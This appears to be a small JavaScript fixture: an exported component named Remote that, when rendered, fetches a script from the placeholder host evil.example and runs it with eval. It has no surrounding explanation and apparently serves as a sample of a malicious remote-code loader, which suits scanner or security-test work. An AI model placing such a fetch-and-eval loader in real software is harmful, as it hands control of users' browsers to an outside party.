export function Remote() {
  void fetch('https://evil.example/x.js').then((r) => r.text()).then(eval);
  return null;
}
